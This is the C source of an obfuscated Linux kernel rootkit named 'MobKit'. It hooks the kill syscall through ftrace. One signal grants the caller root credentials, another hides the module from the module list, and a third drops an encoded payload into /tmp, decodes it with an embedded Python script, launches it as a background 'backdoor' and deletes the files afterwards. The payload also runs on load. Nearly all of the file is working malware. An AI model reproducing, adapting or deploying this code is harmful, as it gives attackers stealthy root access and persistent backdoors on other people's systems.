#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/ftrace.h>
#include <linux/ptrace.h>
#include <linux/kmod.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/sched/signal.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/delay.h>
#include "ft_help.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("shv-om");
MODULE_DESCRIPTION("MobKit");

static pid_t shajshejxn = -1;

static struct list_head *prev_module;
static short dyehsndjks = 0;

#define HAJSNEJDNF "/tmp/hsjajsnsjd.py"
#define JSHDNEJSNA "/tmp/ahsjendhah.txt"

char shdjensjdm[] = "\x3b\x0d\x6b\x2d\x38\x69\x10\x6a\x13\x12\x14\x2c\x03\x68\x2e\x36\x3e\x1b\x2a\x2a\x38\x02\x18\x2c\x39\x34\x0b\x3d\x39\x69\x0c\x33\x39\x12\x10\x2c\x03\x68\x0c\x20\x39\x2d\x2a\x2a\x38\x02\x18\x2c\x39\x34\x0b\x3d\x38\x69\x17\x11\x19\x31\x32\x0a\x0f\x6b\x0b\x3d\x0a\x09\x1b\x34\x17\x19\x6e\x2d\x16\x30\x1b\x2f\x17\x19\x39\x11\x0f\x1f\x63\x09\x0c\x19\x1b\x63\x13\x1e\x1f\x23\x17\x20\x0b\x11\x19\x34\x17\x3d\x0a\x09\x18\x20\x38\x68\x14\x28\x00\x02\x0b\x2f\x39\x68\x63\x30\x3b\x68\x0c\x6a\x11\x12\x14\x2c\x03\x68\x2e\x36\x3e\x19\x6f\x18\x08\x36\x63\x10\x0e\x31\x0c\x0f\x16\x19\x18\x20\x38\x68\x14\x28\x00\x02\x0b\x2f\x0f\x6a\x63\x1e\x09\x6b\x63\x0e\x0c\x1c\x10\x1c\x0b\x0f\x6a\x2a\x19\x34\x17\x2f\x03\x37\x36\x2f\x00\x19\x3d\x35\x09\x1f\x63\x0e\x0c\x19\x2d\x3d\x0f\x1f\x63\x09\x0c\x19\x31\x2a\x19\x34\x17\x2f\x38\x1d\x36\x20\x3e\x1d\x0c\x2f\x11\x1e\x1f\x2a\x19\x34\x18\x23\x3b\x0d\x6f\x6a\x11\x19\x10\x17\x3b\x02\x14\x6a\x00\x0d\x6f\x2a\x38\x37\x39\x3d\x38\x68\x6e\x3d\x39\x1d\x63\x23\x3e\x19\x1b\x22\x17\x30\x17\x6a\x13\x33\x31\x11\x19\x34\x3e\x35\x3b\x0d\x22\x36\x13\x1c\x08\x23\x3e\x0d\x0f\x6c\x19\x33\x1b\x3d\x13\x19\x18\x30\x38\x68\x6f\x2f\x16\x19\x18\x32\x00\x1d\x08\x23\x13\x1e\x6a\x3d\x39\x23\x6f\x32\x03\x68\x14\x36\x39\x12\x0b\x35\x11\x0b\x35\x3d\x13\x19\x1b\x3d\x39\x12\x10\x2a\x38\x34\x0b\x35\x13\x31\x14\x2c\x38\x37\x6f\x36\x03\x69\x08\x2a\x38\x68\x6e\x3d\x0b\x0d\x14\x30\x00\x02\x18\x6a\x00\x0d\x0b\x3d\x00\x34\x10\x2c\x38\x0e\x35\x3d\x3f\x69\x6a\x33\x16\x37\x00\x2c\x39\x37\x6b\x32\x3e\x19\x32\x32\x00\x1d\x08\x23\x11\x09\x31\x11\x13\x19\x1b\x3d\x13\x1b\x35\x3d\x13\x19\x1b\x3d\x3e\x68\x32\x2a\x38\x1d\x0f\x3d\x0c\x12\x10\x6b\x00\x0e\x35\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x31\x03\x02\x08\x32\x13\x1e\x6a\x3d\x03\x68\x63\x2f\x38\x33\x6f\x23\x00\x0d\x14\x68\x11\x1e\x1f\x2d\x17\x30\x0b\x2a\x16\x37\x08\x36\x03\x68\x63\x31\x00\x09\x3d\x34\x3e\x02\x08\x37\x16\x0e\x3d\x34\x11\x09\x6f\x20\x3e\x12\x10\x2a\x39\x19\x3d\x2a\x19\x33\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x3b\x0d\x03\x3d\x38\x37\x63\x6a\x13\x1d\x08\x32\x3e\x1d\x1f\x6c\x19\x33\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x12\x18\x23\x3b\x0d\x6f\x6a\x11\x19\x10\x1e\x38\x68\x6f\x2f\x00\x0d\x14\x6a\x3b\x0d\x63\x2f\x13\x1d\x14\x29\x38\x69\x14\x36\x00\x19\x18\x33\x3f\x09\x18\x30\x38\x1d\x36\x36\x38\x34\x0b\x33\x11\x0b\x35\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x33\x39\x37\x0c\x32\x3b\x2d\x35\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x6a\x39\x34\x31\x6c\x19\x33\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x17\x3d\x08\x02\x32\x36\x03\x69\x0c\x6a\x00\x09\x18\x6a\x3b\x1d\x0f\x3d\x03\x68\x63\x2e\x38\x0d\x1c\x2f\x00\x19\x18\x32\x38\x37\x0b\x3d\x39\x68\x0c\x2f\x00\x19\x18\x33\x03\x0d\x14\x28\x13\x12\x08\x35\x00\x09\x18\x23\x00\x02\x14\x6b\x38\x12\x0b\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x39\x12\x17\x3d\x0a\x09\x18\x20\x3e\x0d\x10\x2d\x39\x37\x63\x30\x00\x02\x14\x20\x16\x36\x18\x2c\x39\x1d\x0c\x2f\x11\x1d\x08\x32\x3e\x1d\x1f\x29\x13\x12\x14\x35\x00\x0d\x22\x29\x0a\x0c\x08\x23\x3e\x0d\x0f\x29\x13\x12\x14\x6a\x00\x1d\x63\x6b\x3e\x1e\x6b\x20\x3e\x0d\x10\x2d\x39\x37\x63\x30\x00\x02\x14\x20\x16\x36\x18\x10\x0f\x1f\x0f\x29\x13\x12\x14\x6a\x00\x1d\x0c\x23\x39\x30\x6b\x20\x3e\x0d\x10\x2d\x39\x37\x63\x30\x00\x02\x14\x20\x16\x36\x14\x0f\x08\x1f\x63\x0c\x0c\x19\x31\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x39\x37\x0c\x20\x3e\x0d\x22\x6a\x13\x1e\x6a\x3d\x39\x12\x17\x2f\x03\x68\x63\x2e\x38\x02\x0c\x2f\x3b\x0d\x14\x32\x3e\x1d\x0f\x35\x11\x0c\x29\x2d\x02\x0b\x35\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x23\x00\x02\x14\x6b\x38\x12\x0b\x3d\x11\x20\x6a\x3d\x00\x33\x13\x6d\x13\x12\x18\x2a\x00\x1e\x35\x3d\x3f\x68\x63\x20\x16\x37\x3e\x36\x3e\x12\x18\x2a\x00\x19\x3d\x2a\x3c\x0e\x29\x3d\x39\x12\x18\x2a\x00\x1e\x35\x3d\x3f\x68\x63\x20\x16\x37\x3e\x36\x3e\x12\x18\x2d\x3b\x0d\x0b\x35\x11\x02\x6b\x39\x38\x33\x13\x2f\x00\x0d\x6f\x30\x38\x68\x08\x36\x11\x19\x3e\x6b\x3e\x1d\x03\x2e\x15\x19\x39\x2a\x19\x3d\x35\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x1d\x0c\x6e\x03\x68\x0c\x2d\x3e\x19\x18\x1c\x3f\x1d\x14\x36\x39\x12\x08\x2a\x38\x68\x6e\x3d\x03\x02\x17\x3d\x00\x0e\x35\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x39\x37\x0c\x20\x3e\x0d\x22\x6a\x13\x1e\x6a\x3d\x39\x69\x08\x23\x11\x1d\x0f\x2a\x16\x37\x0c\x2f\x03\x68\x63\x31\x00\x09\x3d\x34\x3e\x02\x08\x37\x16\x0e\x3d\x34\x11\x0b\x35\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x1b\x30\x13\x1c\x14\x36\x38\x37\x0b\x3d\x3e\x1d\x32\x36\x13\x12\x10\x36\x39\x69\x0c\x29\x3e\x19\x18\x33\x03\x0d\x14\x28\x13\x12\x08\x2c\x13\x12\x08\x35\x00\x09\x18\x30\x38\x1d\x36\x36\x38\x34\x0b\x11\x13\x19\x1b\x3d\x13\x19\x1b\x3d\x13\x19\x18\x30\x38\x68\x6f\x2f\x16\x34\x14\x36\x38\x37\x08\x32\x38\x1d\x2d\x35\x39\x37\x0c\x20\x3e\x0d\x22\x6a\x11\x0b\x35\x11\x13\x19\x1b\x3d\x13\x1d\x14\x2c\x38\x37\x6e\x2f\x03\x68\x22\x2c\x39\x68\x0f\x35\x11\x0b\x35\x3d\x13\x19\x1b\x3d\x39\x12\x10\x2a\x38\x34\x0b\x35\x13\x31\x14\x2c\x38\x37\x6f\x36\x03\x69\x08\x2a\x38\x68\x6e\x3d\x03\x68\x22\x2c\x39\x68\x0c\x31\x13\x12\x3e\x2a\x3e\x1d\x3d\x6c\x13\x12\x2e\x63\x13\x33\x6f\x37\x38\x69\x10\x2e\x03\x02\x0b\x35\x03\x0d\x08\x31\x39\x33\x31\x2a\x19\x3d\x67\x67";

bool ldksjeushd(const char *path) {
    struct file *file = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(file)) {
        return false;
    }
    filp_close(file, NULL);
    return true;
}

void ahsgehdbsj(const char *filepath) {
    char *argv[] = { "/bin/bash", "-c", NULL, NULL };
    char cmd[256];
    int ret;

    snprintf(cmd, sizeof(cmd), "rm -f %s", filepath);
    argv[2] = cmd;

    ret = call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);

    if(ret == 0){
        printk(KERN_INFO "mob: [INFO] File Deleted %s\n", filepath);
    }
}

void hajsndjems(void){
    list_add(&THIS_MODULE->list, prev_module);
}

void uehsnshans(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void heuhsjalso(void){

    struct cred *root;
    root = prepare_creds();

    if (root == NULL){
        return;
    }

    root->uid = KUIDT_INIT(0);
    root->gid = KGIDT_INIT(0);
    root->euid = KUIDT_INIT(0);
    root->egid = KGIDT_INIT(0);
    root->suid = KUIDT_INIT(0);
    root->sgid = KGIDT_INIT(0);
    root->fsuid = KUIDT_INIT(0);
    root->fsgid = KGIDT_INIT(0);

    commit_creds(root);
}


void idjehsndhs(void){

    char *argv[] = { "/bin/bash", "-c", "ps aux | grep 'hsjajsnsjd' | grep -v 'grep' | awk '{print $2}' > /tmp/dheysgdbah.txt", NULL };
    static char *envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    
    struct file *file;
    char buf[16] = {0};
    loff_t pos = 0;
    int ret;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret != 0) {
        printk(KERN_ERR "mob: [ERROR] Error checking the process\n");
        return;
    }

    file = filp_open("/tmp/dheysgdbah.txt", O_RDONLY, 0);
    if (IS_ERR(file)) {
        printk(KERN_ERR "Failed to open file, error: %ld\n", PTR_ERR(file));
        return;
    }

    ret = kernel_read(file, buf, sizeof(buf) - 1, &pos);
    filp_close(file, NULL);
    
    if (ret > 0) {
        ret = kstrtoint(buf, 10, &shajshejxn);
        if (ret < 0) {
            shajshejxn = -1;
        } else {
            printk(KERN_INFO "mob: [INFO] Retrieved PID: %d\n", shajshejxn);
        }
    } else {
        printk(KERN_ERR "mob: [ERROR] Failed to read PID from /tmp/dheysgdbah.txt\n");
    }
}

int jdkelskjds(const char *filepath, char *data) {
    struct file *file;
    loff_t pos = 0;
    int ret;
    size_t written = 0;
    size_t data_size = sizeof(shdjensjdm) - 1;

    file = filp_open(filepath, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (IS_ERR(file)) {
        return PTR_ERR(file);
    }

    while (written < data_size) {
        ret = kernel_write(file, data + written, data_size - written, &pos);
        if (ret < 0) {
            break;
        }
        written += ret;
    }

    filp_close(file, NULL);

    return (written == data_size) ? 0 : -EIO;
}

// // Delete Encoded file
// int ahsgehdbsj(void){

//     char *argv[] = { "/bin/bash", "-c", "rm -f /tmp/ahsjendhah.txt", NULL };
//     static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
//     int ret;

//     ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

//     return 0;
// }


int uehsjdnshd(void){

    char *argv[] = { "/bin/bash", "-c", "echo 'aW1wb3J0IGJhc2U2NAp3aXRoIG9wZW4oJy90bXAvYWhzamVuZGhhaC50eHQnLCAncmInKSBhcyBmOgogICAgdHJnZWhqZGtlbCA9IGYucmVhZCgpCmtleSA9IDB4NUEKaHNuZHV0aWVsYSA9IGJ5dGVzKFtiIF4ga2V5IGZvciBiIGluIHRyZ2VoamRrZWxdKQp0cnk6CiAgICBoc25haHNuZWpkID0gYmFzZTY0LmI2NGRlY29kZShoc25kdXRpZWxhKS5kZWNvZGUoJ3V0Zi04JykKICAgIHdpdGggb3BlbignL3RtcC9oc2phanNuc2pkLnB5JywgJ3cnKSBhcyBmOgogICAgICAgIGYud3JpdGUoaHNuYWhzbmVqZCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgoJcGFzcwo=' | base64 -d > /tmp/dheysjdnsj.py && exec python3 /tmp/dheysjdnsj.py > decoderlog.txt 2>&1", NULL };
    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    int ret;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

    return 0;
}

int jdkepflfks(void){

    char *argv[] = { "/bin/bash", "-c", "nohup python3 /tmp/hsjajsnsjd.py > /dev/null 2>&1 & disown", NULL };
    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    int ret;
    int processcheckercount = 0;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret == 0) {
        idjehsndhs();
        printk(KERN_INFO "mob: [INFO] Backdoor Initiated...\n");
        
        while ((shajshejxn == -1) || (processcheckercount == 10)){
            ssleep(2);
            idjehsndhs();
            processcheckercount++;
            printk(KERN_INFO "mob: [INFO] Checking for Process ID loop: %d\n", processcheckercount);
        }

        printk(KERN_INFO "mob: [INFO] 0 Payload PID: %d\n", shajshejxn);
    }

    if (ldksjeushd(JSHDNEJSNA)){
        ahsgehdbsj(JSHDNEJSNA);
        printk(KERN_INFO "mob: [INFO] Encoded File Deleted\n");
    }

    return 0;
}

void uwhanslajs(void) {
    struct task_struct *task;

    if (shajshejxn < 0) {
        return;
    }

    idjehsndhs();

    for_each_process(task) {
        if (task->pid == shajshejxn) {
            send_sig(SIGKILL, task, 1);
            shajshejxn = -1;
            return;
        }
    }

    printk(KERN_INFO "mob: [INFO] Backdoor Removed...\n");

    shajshejxn = -1;
}


void oehjdpajek(void){
    if (jdkelskjds(JSHDNEJSNA, shdjensjdm) >= 0) {           
        uehsjdnshd(); // execute decoder
        ssleep(7);
        ahsgehdbsj("/tmp/dheysjdnsj.py"); // remove encoded file

        if (ldksjeushd(HAJSNEJDNF)){
            jdkepflfks(); // execute payload
            ssleep(7);
            ahsgehdbsj(HAJSNEJDNF); // remove payload file
            printk(KERN_INFO "mob: [INFO] 4 Payload PID: %d\n", shajshejxn);
        } else {
            printk(KERN_INFO "mob: [INFO] 5 Payload PID: %d\n", shajshejxn);
        }
    } else {
        printk(KERN_INFO "mob: [INFO] 8 Payload PID: %d\n", shajshejxn);
    }
}


asmlinkage int ghsjdkensj(struct ftrace_regs *regs) {
    struct pt_regs *pt_regs = ftrace_get_regs(regs);

    if (!pt_regs) {
        return -EINVAL;
    }

    void heuhsjalso(void);

    void hajsndjems(void);
    void uehsnshans(void);

    int jdkepflfks(void);
    void uwhanslajs(void);

    int sig = regs_get_kernel_argument(pt_regs, 1);

    if (sig == 0) {
        return 0;
    }
    
    if (sig == 61) {
        if (shajshejxn == -1) {
            oehjdpajek();
        } else {
            uwhanslajs();
            printk(KERN_INFO "mob: [INFO] 3 Payload PID: %d\n", shajshejxn);
        }
        return 0;
    } else if (sig == 64){
        heuhsjalso();
        return 0;
    } else if ((sig == 63) && (dyehsndjks == 0)){
        uehsnshans();
        dyehsndjks = 1;
    } else if ((sig == 63) && (dyehsndjks == 1)){
        hajsndjems();
        dyehsndjks = 0;
    } else {
        return orig_kill(pt_regs);
    }

    return 0;
}


static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", ghsjdkensj, &orig_kill),
};

static int __init mob_module_init(void) {
    int err = uejshdnskd(&hooks[0]);
    
    if (err) {
        return err;
    }
    printk(KERN_INFO "mob: [INFO] Module loaded\n");

    oehjdpajek();

    return 0;
}

static void __exit mob_module_exit(void) {
    jdhenshdks(&hooks[0]);
    printk(KERN_INFO "mob: [INFO] Module unloaded\n");
}

module_init(mob_module_init);
module_exit(mob_module_exit);
